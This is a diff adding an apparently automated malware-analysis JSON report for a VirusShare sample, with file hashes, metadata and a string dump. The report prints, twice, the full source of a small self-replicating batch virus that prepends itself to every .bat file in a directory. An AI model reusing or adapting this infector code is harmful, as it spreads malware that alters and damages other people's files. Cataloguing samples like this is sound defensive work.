@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "REM 391 Bytes Bat Prepender\n@echo off%CW%%y0%\nif '%1' == '' goto c%y0%\nfind \"CW\" <%1 >nul%y0%\nif not errorlevel 1 goto e%y0%\nif exist %0.bat goto b%y0%\nset f=%0%y0%\ngoto i%y0%\n:b %y0%\nset f=%0.bat%y0%\nren %1 vir.tmp%y0%\nset v1=n%y0%\nfind \"y0\"<%f% >>%1\necho :d>>%1%y0%\ntype vir.tmp >>%1%y0%\necho :e>>%1%y0%\ndel vir.tmp%y0t%\ngoto e%y0%\n:c %y0%\nfor %%a in (*.bat) do call %0 %%a%y0%\ngoto d%y0%\n:d\necho host file\n:e"
+    },
+    "filename": "VirusShare_9199c26e5408e3644d68695a3da0b689",
+    "filesize": 436,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "9199c26e5408e3644d68695a3da0b689",
+        "sha1": "540232264dc3775447c70f339317066cc2b2950c",
+        "sha256": "f002af046b6b7971eb2b643e0852fdbe7fad92efdda5f50a5f5c67376edcbddf"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "REM 391 Bytes Bat Prepender",
+            "@echo off%CW%%y0%",
+            "if '%1' == '' goto c%y0%",
+            "find \"CW\" <%1 >nul%y0%",
+            "if not errorlevel 1 goto e%y0%",
+            "if exist %0.bat goto b%y0%",
+            "set f=%0%y0%",
+            "goto i%y0%",
+            ":b %y0%",
+            "set f=%0.bat%y0%",
+            "ren %1 vir.tmp%y0%",
+            "set v1=n%y0%",
+            "find \"y0\"<%f% >>%1",
+            "echo :d>>%1%y0%",
+            "type vir.tmp >>%1%y0%",
+            "echo :e>>%1%y0%",
+            "del vir.tmp%y0t%",
+            "goto e%y0%",
+            ":c %y0%",
+            "for %%a in (*.bat) do call %0 %%a%y0%",
+            "goto d%y0%",
+            "echo host file"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266476",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
